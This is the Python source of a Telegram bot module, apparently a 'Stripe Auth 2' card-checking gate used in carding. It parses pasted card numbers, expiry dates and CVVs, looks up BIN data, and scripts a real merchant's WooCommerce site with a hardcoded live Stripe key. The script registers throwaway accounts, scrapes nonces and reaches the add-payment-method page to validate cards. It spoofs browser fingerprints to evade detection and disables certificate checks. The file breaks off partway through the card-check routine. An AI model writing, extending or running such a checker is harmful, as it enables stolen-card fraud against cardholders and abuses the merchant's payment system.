# BOT/gates/auth/stripe/stauth2.py
# Stripe Auth 2 Checker - Smart Card Parser with Enhanced UI
# Compatible with ALL card formats - Intelligent parsing
# Ubuntu VPS Optimized Version

import json
import asyncio
import re
import time
import aiohttp
import random
import string
import logging
import ssl
import certifi
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.WARNING)
        self.logger.propagate = False

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def stripe(self, message):
        print(f"🔄 {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def parsing(self, message):
        print(f"🔍 {message}")

# Create global logger instance
logger = EmojiLogger()

# Suppress other loggers
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("aiohttp").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()
        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="chk"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

# NO CREDIT DEDUCTION FOR ANY USER - This gate is FREE
# REMOVED: update_user_credits function completely for this command

class SmartCardParser:
    """Intelligent card parser that handles ANY format"""

    @staticmethod
    def extract_card_from_text(text):
        """
        Extract card details from ANY text format.
        Returns: (cc, month, year, cvv) or (None, None, None, None)
        """
        logger.parsing(f"Parsing text: {text[:100]}...")

        # Remove command prefixes if any
        text = re.sub(r'^/(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)
        text = re.sub(r'^\.(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)
        text = re.sub(r'^\$(chk|au|bin|sk|gen|fake|gate)\s*', '', text, flags=re.IGNORECASE)

        # Clean the text
        text = text.strip()

        # STRATEGY 1: Direct pipe format (most common)
        # Format: 4355460265778976|01|2028|221 or 4355460265778976|01/2028|221
        if '|' in text:
            parts = [p.strip() for p in text.split('|')]
            if len(parts) >= 1:
                # Find CC in first part
                cc_match = re.search(r'(\d{15,19})', parts[0])
                if cc_match:
                    cc = cc_match.group(1)

                    # Try to extract month/year/cvv from remaining parts
                    month, year, cvv = None, None, None

                    if len(parts) >= 2:
                        # Check if second part has month/year combined
                        date_part = parts[1]
                        if '/' in date_part:
                            date_parts = date_part.split('/')
                            if len(date_parts) >= 2:
                                month = date_parts[0].strip()
                                year = date_parts[1].strip()
                        else:
                            month = date_part

                    if len(parts) >= 3:
                        if year is None:
                            year = parts[2]
                        else:
                            cvv = parts[2]

                    if len(parts) >= 4:
                        cvv = parts[3]

                    # Try to find CVV in text if not found
                    if cvv is None:
                        cvv_match = re.search(r'(\d{3,4})(?:\s|$|/)', text)
                        if cvv_match:
                            cvv = cvv_match.group(1)

                    # Validate what we have
                    if month and year and cvv:
                        # Clean year
                        year = re.sub(r'\D', '', year)
                        if len(year) == 2:
                            year = '20' + year

                        # Clean month
                        month = re.sub(r'\D', '', month)

                        # Clean CVV
                        cvv = re.sub(r'\D', '', cvv)

                        if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
                            logger.parsing(f"Parsed via pipe format: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
                            return cc, month, year, cvv

        # STRATEGY 2: Multi-line format (with address info)
        lines = [line.strip() for line in text.split('\n') if line.strip()]

        # Look for CC in any line
        cc = None
        for line in lines:
            cc_match = re.search(r'(\d{15,19})', line)
            if cc_match:
                cc = cc_match.group(1)
                break

        if cc:
            # Look for date in MM/YY or MM/YYYY format
            month, year = None, None
            date_patterns = [
                r'(\d{1,2})[/-](\d{2,4})',  # 01/28 or 01/2028
                r'(\d{2})(\d{2,4})',        # 0128 or 012028
            ]

            for line in lines:
                for pattern in date_patterns:
                    date_match = re.search(pattern, line)
                    if date_match:
                        month = date_match.group(1)
                        year = date_match.group(2)
                        if len(year) == 2:
                            year = '20' + year
                        break
                if month and year:
                    break

            # Look for CVV (3 or 4 digits)
            cvv = None
            cvv_patterns = [
                r'(\d{3,4})(?:\s|$|/)',
                r'cvv[:\s]*(\d{3,4})',
                r'cvc[:\s]*(\d{3,4})',
                r'cid[:\s]*(\d{3,4})',
            ]

            for line in lines:
                for pattern in cvv_patterns:
                    cvv_match = re.search(pattern, line.lower())
                    if cvv_match:
                        cvv = cvv_match.group(1)
                        break
                if cvv:
                    break

            # If we found all components
            if month and year and cvv:
                month = re.sub(r'\D', '', month)
                year = re.sub(r'\D', '', year)
                cvv = re.sub(r'\D', '', cvv)

                if month.isdigit() and year.isdigit() and cvv.isdigit():
                    logger.parsing(f"Parsed via multiline format: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
                    return cc, month, year, cvv

        # STRATEGY 3: Regex search in entire text
        # Try to find CC + date + CVV patterns
        combined_patterns = [
            # Pattern: CC followed by date and CVV
            r'(\d{15,19})[^\d]*(\d{1,2})[/-]?(\d{2,4})[^\d]*(\d{3,4})',
            # Pattern: CC, date in next 50 chars, CVV in next 20 chars
            r'(\d{15,19}).{1,50}?(\d{1,2})[/-]?(\d{2,4}).{1,20}?(\d{3,4})',
        ]

        for pattern in combined_patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                cc = match.group(1)
                month = match.group(2)
                year = match.group(3)
                cvv = match.group(4)

                # Clean and validate
                month = re.sub(r'\D', '', month)
                year = re.sub(r'\D', '', year)
                cvv = re.sub(r'\D', '', cvv)

                if len(year) == 2:
                    year = '20' + year

                if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
                    logger.parsing(f"Parsed via regex pattern: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
                    return cc, month, year, cvv

        # STRATEGY 4: Look for CC and try to infer other details
        if cc:
            # Extract month from text (look for 1-12)
            month_pattern = r'\b(0?[1-9]|1[0-2])\b'
            month_match = re.search(month_pattern, text)
            month = month_match.group(1) if month_match else None

            # Extract year (look for 2 or 4 digit years)
            year_patterns = [
                r'\b(20\d{2})\b',  # 2024, 2025, etc
                r'\b(\d{2})(?:\s|$|/)',  # 24, 25, etc
            ]

            year = None
            for pattern in year_patterns:
                year_match = re.search(pattern, text)
                if year_match:
                    year = year_match.group(1)
                    if len(year) == 2:
                        year = '20' + year
                    break

            # Extract CVV
            cvv_pattern = r'\b(\d{3,4})\b'
            # Try to find CVV that's NOT part of CC or date
            for match in re.finditer(cvv_pattern, text):
                cvv_candidate = match.group(1)
                # Skip if it's part of CC or date
                if cvv_candidate not in cc and cvv_candidate != month and cvv_candidate != year:
                    cvv = cvv_candidate
                    break

            if month and year and cvv:
                logger.parsing(f"Parsed via inference: {cc[:6]}XXXXXX{cc[-4:]}|{month}|{year}|{cvv}")
                return cc, month, year, cvv

        logger.warning("Could not parse card details from text")
        return None, None, None, None

    @staticmethod
    def validate_card_details(cc, month, year, cvv):
        """Validate parsed card details"""
        if not cc or not month or not year or not cvv:
            return False, "Missing card components"

        # Check CC length
        if not (15 <= len(cc) <= 19):
            return False, "Invalid card number length"

        # Check month
        if not month.isdigit() or not (1 <= int(month) <= 12):
            return False, "Invalid month (must be 01-12)"

        # Check year
        if not year.isdigit() or len(year) != 4:
            return False, "Invalid year (must be 4 digits)"

        # Check if card is expired
        current_year = datetime.now().year
        current_month = datetime.now().month

        if int(year) < current_year:
            return False, "Card expired"
        elif int(year) == current_year and int(month) < current_month:
            return False, "Card expired"

        # Check CVV
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            return False, "Invalid CVV (must be 3-4 digits)"

        return True, "Valid"

class StripeAuth2Checker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://keysium.com"
        self.stripe_key = "pk_live_51Kc3g9DdApxJGyJPx748yOELsmezxMjeRKxYUxbHEq0fogP5ZyYwJXhFlsiZLXshhsz7vjJrO08pZSAhcI6zr0w000BjkbpJWO"

        # Ubuntu VPS specific settings
        self.ubuntu_mode = True  # Enable Ubuntu VPS optimizations
        
        # Generate random browser fingerprints
        self.generate_browser_fingerprint()

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints to bypass detection"""
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]

        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]

        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]

        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)

        # Updated sec-ch-ua to match the trace
        self.sec_ch_ua = '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"'

        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"

    def get_country_emoji(self, country_code):
        """Get country flag emoji"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'EG': '🇪🇬', 'MA': '🇲🇦', 'DZ': '🇩🇿', 'TN': '🇹🇳', 'LY': '🇱🇾',
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers matching the trace"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
        }

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'

        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information with proper flag handling - Ubuntu VPS optimized"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        # Ubuntu VPS optimized SSL context
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # Try binlist.net first (more reliable on Ubuntu)
        try:
            url = f"https://lookup.binlist.net/{bin_number}"
            headers = {'Accept-Version': '3', 'User-Agent': self.user_agent}

            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
            timeout = aiohttp.ClientTimeout(total=20, connect=10, sock_read=15)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(url, headers=headers, timeout=20) as response:
                    if response.status == 200:
                        data = await response.json()
                        result = self.parse_binlist_net(data)

                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                            better_flag = self.get_country_emoji(result['country_code'])
                            result['emoji'] = better_flag

                        self.bin_cache[bin_number] = result
                        return result
        except Exception as e:
            logger.warning(f"binlist.net failed: {e}")

        # Fallback to antipublic.cc
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
            timeout = aiohttp.ClientTimeout(total=20, connect=10, sock_read=15)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(url, headers=headers, timeout=20) as response:
                    if response.status == 200:
                        data = await response.json()
                        if "detail" in data and "not found" in data["detail"].lower():
                            logger.warning(f"BIN {bin_number} not found in antipublic.cc")
                        else:
                            result = self.parse_antipublic(data)
                            self.bin_cache[bin_number] = result
                            return result
        except Exception as e:
            logger.warning(f"antipublic.cc failed: {e}")

        self.bin_cache[bin_number] = default_response
        return default_response

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response with same UI as stauth.py"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        if "APPROVED" in status:
            status_emoji = "✅"
            status_text = "APPROVED"
        elif "DECLINED" in status:
            status_emoji = "❌"
            status_text = "DECLINED"
        else:
            status_emoji = "⚠️"
            status_text = status.upper() if status else "ERROR"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /chk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Auth 2
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /chk」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Auth 2
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    def create_ssl_context_ubuntu(self):
        """Create SSL context optimized for Ubuntu VPS"""
        try:
            # Try to use system certificates first
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            ssl_context.check_hostname = True
            ssl_context.verify_mode = ssl.CERT_REQUIRED
            return ssl_context
        except:
            # Fallback to permissive mode
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            return ssl_context

    def create_ssl_context_noverify(self):
        """Create SSL context with no verification (for problematic sites)"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        return ssl_context

    async def test_connection(self, session):
        """Test if we can connect to the website"""
        try:
            async with session.get(f"{self.base_url}/", timeout=10) as response:
                return response.status == 200
        except:
            return False

    async def create_authenticated_session(self):
        """Create authenticated session with aiohttp - ULTIMATE UBUNTU VPS VERSION"""
        session = None
        connector = None

        try:
            # Try different SSL strategies for Ubuntu VPS
            ssl_strategies = [
                self.create_ssl_context_ubuntu,  # Try with cert verification first
                self.create_ssl_context_noverify,  # Fallback to no verification
            ]
            
            successful_session = False
            
            for strategy_idx, ssl_strategy in enumerate(ssl_strategies):
                try:
                    logger.network(f"Trying SSL strategy {strategy_idx + 1}/{len(ssl_strategies)}")
                    
                    ssl_context = ssl_strategy()
                    
                    # Create connector with Ubuntu-optimized settings
                    connector = aiohttp.TCPConnector(
                        ssl=ssl_context,
                        limit=15,
                        limit_per_host=5,
                        ttl_dns_cache=600,
                        enable_cleanup_closed=True,
                        force_close=False,
                        keepalive_timeout=60,
                        use_dns_cache=True
                    )

                    # Create session with generous timeouts for Ubuntu VPS
                    timeout = aiohttp.ClientTimeout(
                        total=90,  # Very generous timeout for slow VPS
                        connect=30,
                        sock_read=60,
                        sock_connect=30
                    )

                    session = aiohttp.ClientSession(
                        connector=connector,
                        timeout=timeout,
                        headers=self.get_base_headers()
                    )

                    # Test connection
                    logger.step(1, 6, "Testing connection to website...")
                    if await self.test_connection(session):
                        logger.success(f"SSL strategy {strategy_idx + 1} works!")
                        successful_session = True
                        break
                    else:
                        logger.warning(f"SSL strategy {strategy_idx + 1} failed")
                        await session.close()
                        await connector.close()
                        session = None
                        connector = None
                        
                except Exception as e:
                    logger.warning(f"SSL strategy {strategy_idx + 1} error: {str(e)[:100]}")
                    if session:
                        await session.close()
                    if connector:
                        await connector.close()
                    session = None
                    connector = None
                    continue

            if not successful_session or not session:
                logger.error("All SSL strategies failed")
                return None, None, "Failed to establish secure connection"

            # Step 2: Go to my-account page (registration page)
            logger.step(2, 6, "Accessing my-account page for registration...")
            account_url = f"{self.base_url}/my-account/"

            headers = self.get_base_headers()
            headers['Referer'] = f"{self.base_url}/"

            try:
                async with session.get(account_url, headers=headers, timeout=30) as response:
                    if response.status != 200:
                        logger.error(f"My-account page failed: {response.status}")
                        # Try with different user agent
                        logger.warning("Trying with different user agent...")
                        headers['User-Agent'] = random.choice(self.user_agents)
                        
                        async with session.get(account_url, headers=headers, timeout=30) as retry_response:
                            if retry_response.status != 200:
                                return None, None, f"Failed to access my-account: {retry_response.status}"
                            account_text = await retry_response.text()
                    else:
                        account_text = await response.text()

                    logger.debug_response(f"Account page length: {len(account_text)} chars")

                    # Step 3: Extract nonce
                    logger.step(3, 6, "Extracting nonce from page...")

                    nonce = None
                    patterns = [
                        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([a-fA-F0-9]{8,12})["\']',
                        r'value=["\']([a-fA-F0-9]{8,12})["\'][^>]*name=["\']woocommerce-register-nonce["\']',
                        r'woocommerce-register-nonce["\']?\s*[:=]\s*["\']([a-fA-F0-9]{8,12})["\']',
                        r'<input[^>]*name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
                        r'register["\']?[_-]?nonce["\']?\s*[=:]\s*["\']([a-fA-F0-9]{8,12})["\']',
                    ]

                    for i, pattern in enumerate(patterns):
                        match = re.search(pattern, account_text, re.IGNORECASE)
                        if match:
                            nonce = match.group(1)
                            logger.success(f"Found nonce using pattern {i+1}: {nonce}")
                            break

                    if not nonce:
                        logger.error("Could not find any nonce on the page")
                        return None, None, "Could not find registration/login nonce"

                    # Step 4: Register account - SIMPLIFIED FOR UBUNTU VPS
                    logger.step(4, 6, "Attempting registration (Ubuntu VPS optimized)...")
                    
                    # Generate simpler credentials for Ubuntu VPS
                    random_id = random.randint(1000, 9999)
                    username = f"user{random_id}"
                    email = f"user{random_id}@gmail.com"
                    password = f"Password{random_id}!"

                    reg_url = f"{self.base_url}/my-account/"

                    # Simplified registration data for Ubuntu VPS
                    reg_data = {
                        'email': email,
                        'password': password,
                        '_wp_http_referer': '/my-account/',
                        'woocommerce-register-nonce': nonce,
                        'register': 'Register'
                    }

                    headers = self.get_base_headers()
                    headers.update({
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': self.base_url,
                        'Referer': reg_url,
                    })

                    # Add retry logic for registration
                    max_registration_attempts = 2
                    registration_success = False
                    
                    for attempt in range(max_registration_attempts):
                        logger.network(f"Registration attempt {attempt + 1}/{max_registration_attempts}")
                        try:
                            async with session.post(reg_url, data=reg_data, headers=headers, 
                                                 allow_redirects=True, timeout=45) as response:
                                
                                response_text = await response.text()
                                response_url = str(response.url)
                                
                                # Check for success
                                if response.status in [200, 302]:
                                    if response.status == 302:
                                        location = response.headers.get('location', '')
                                        if location and '/my-account/' in location:
                                            logger.success("Registration successful (302 redirect)")
                                            registration_success = True
                                            break
                                    
                                    if '/my-account/' in response_url:
                                        logger.success("Registration successful (my-account URL)")
                                        registration_success = True
                                        break
                                    
                                    # Check content for success indicators
                                    if any(indicator in response_text.lower() for indicator in 
                                           ['my-account', 'dashboard', 'logout', 'log out', 'welcome']):
                                        logger.success("Registration successful (content check)")
                                        registration_success = True
                                        break
                                
                                if attempt < max_registration_attempts - 1:
                                    logger.warning(f"Registration attempt {attempt + 1} failed, retrying...")
                                    await asyncio.sleep(3)
                                    
                        except Exception as e:
                            logger.warning(f"Registration attempt {attempt + 1} error: {str(e)[:100]}")
                            if attempt < max_registration_attempts - 1:
                                await asyncio.sleep(3)

                    if not registration_success:
                        logger.error("Registration failed after all attempts")
                        return None, None, "Registration failed"

                    logger.success("Registration successful")
                    await asyncio.sleep(random.uniform(3.0, 5.0))

                    # Step 5: Go to add-payment-method page
                    logger.step(5, 6, "Going to add-payment-method page...")
                    add_payment_url = f"{self.base_url}/my-account/add-payment-method/"

                    headers = self.get_base_headers()
                    headers['Referer'] = f"{self.base_url}/my-account/"

                    async with session.get(add_payment_url, headers=headers, timeout=30) as add_response:
                        if add_response.status != 200:
                            logger.error(f"Add payment page failed: {add_response.status}")
                            return None, None, f"Add payment page failed: {add_response.status}"

                        add_payment_text = await add_response.text()

                        # Step 6: Extract AJAX nonce
                        logger.step(6, 6, "Extracting AJAX nonce...")

                        ajax_nonce = None
                        ajax_patterns = [
                            r'name=["\']_ajax_nonce["\'][^>]*value=["\']([a-fA-F0-9]{8,12})["\']',
                            r'"_ajax_nonce"\s*:\s*"([a-fA-F0-9]{8,12})"',
                            r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([a-fA-F0-9]{8,12})["\']',
                        ]

                        for i, pattern in enumerate(ajax_patterns):
                            match = re.search(pattern, add_payment_text, re.IGNORECASE)
                            if match:
                                ajax_nonce = match.group(1)
                                logger.success(f"Found AJAX nonce using pattern {i+1}: {ajax_nonce}")
                                break

                        if not ajax_nonce:
                            # Look for any nonce in JavaScript
                            js_pattern = r'nonce\s*[=:]\s*["\']([a-fA-F0-9]{8,12})["\']'
                            match = re.search(js_pattern, add_payment_text, re.IGNORECASE)
                            if match:
                                ajax_nonce = match.group(1)
                                logger.success(f"Found AJAX nonce in JavaScript: {ajax_nonce}")

                        if not ajax_nonce:
                            logger.error("AJAX nonce not found")
                            return None, None, "AJAX nonce not found"

                        logger.success("Session creation completed successfully")
                        return session, ajax_nonce, "Success"

            except asyncio.TimeoutError:
                logger.error("Account page timeout")
                return None, None, "Account page timeout"
            except Exception as e:
                logger.error(f"Account page error: {str(e)}")
                return None, None, f"Account page error: {str(e)}"

        except Exception as e:
            logger.error(f"Session creation failed: {str(e)}")
            if session:
                await session.close()
            if connector:
                await connector.close()
            return None, None, f"Session creation failed: {str(e)}"

    async def check_card(self, card_details, username, user_data):
        start_time = time.time()
        cc, mes, ano, cvv = "", "", "", ""
        session = None
        connector = None

        try:
            # Use SmartCardParser to extract card details from ANY format
            logger.parsing(f"Input received: {card_details[:100]}...")
            cc, mes, ano, cvv = SmartCardParser.extract_card_from_text(card_details)

            if not cc:
